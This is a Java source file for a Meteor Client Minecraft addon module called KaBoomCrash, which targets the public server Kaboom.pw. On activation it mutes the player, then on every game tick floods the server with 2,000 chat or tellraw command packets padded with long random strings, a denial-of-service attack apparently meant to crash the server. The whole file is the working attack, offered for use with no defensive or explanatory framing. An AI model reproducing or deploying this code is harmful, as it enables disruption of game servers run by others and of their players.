package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class KABOOMCRASH extends Module {
    private static final String CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private final SettingGroup sgGeneral = settings.createGroup("Rate");

    public KABOOMCRASH() {
        super(AddonTemplate.CATEGORY, "KaBoomCrash", "Only Working Kaboom.pw");
    }

    private int length = 2032; // 이게 좋은 코드

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets per tick")
        .description("Amount of packets sent each tick")
        .defaultValue(2000)
        .min(2000)
        .sliderMax(2000)
        .build()
    );
    private final Setting<Modes> payloads = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which Crash mode to use.")
        .defaultValue(Modes.MSG)
        .build()
    );
    public enum Modes {
        MSG,
        W,
        TELLRAW
    }
    @Override
    public void onActivate() {
        MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket("mute " + mc.player.getName().getLiteralString() + " 10m"));
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (payloads.get()) {
            case MSG -> {
                String overflow = generateJsonObject(length);
                String message = "msg PAYLOAD PAYLOAD";
                String partialCommand = message.replace("PAYLOAD", overflow);
                for (int i = 0; i < packets.get(); i++) {
                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                }
            }
            case W -> {
                String overflow = generateJsonObject(length);
                String message = "w PAYLOAD PAYLOAD";
                String partialCommand = message.replace("PAYLOAD", overflow);
                for (int i = 0; i < packets.get(); i++) {
                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                }
            }
            case TELLRAW -> {
                String overflow = generateJsonObject(length);
                String message = "tellraw PAYLOAD \"PAYLOAD\"";
                String partialCommand = message.replace("PAYLOAD", overflow);
                for (int i = 0; i < packets.get(); i++) {
                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                }
            }
        }
    }

    private static String generateJsonObject(int levels) {
        Random random = new Random();
        String in = IntStream.range(0, levels)
            .mapToObj(i -> String.valueOf(CHARS.charAt(random.nextInt(CHARS.length()))))
            .collect(Collectors.joining());
        return in;
    }
    @EventHandler
    private void onWorldChange(GameLeftEvent event) {
        if (this.isActive()) if (this.isActive()) this.toggle();
    }
}
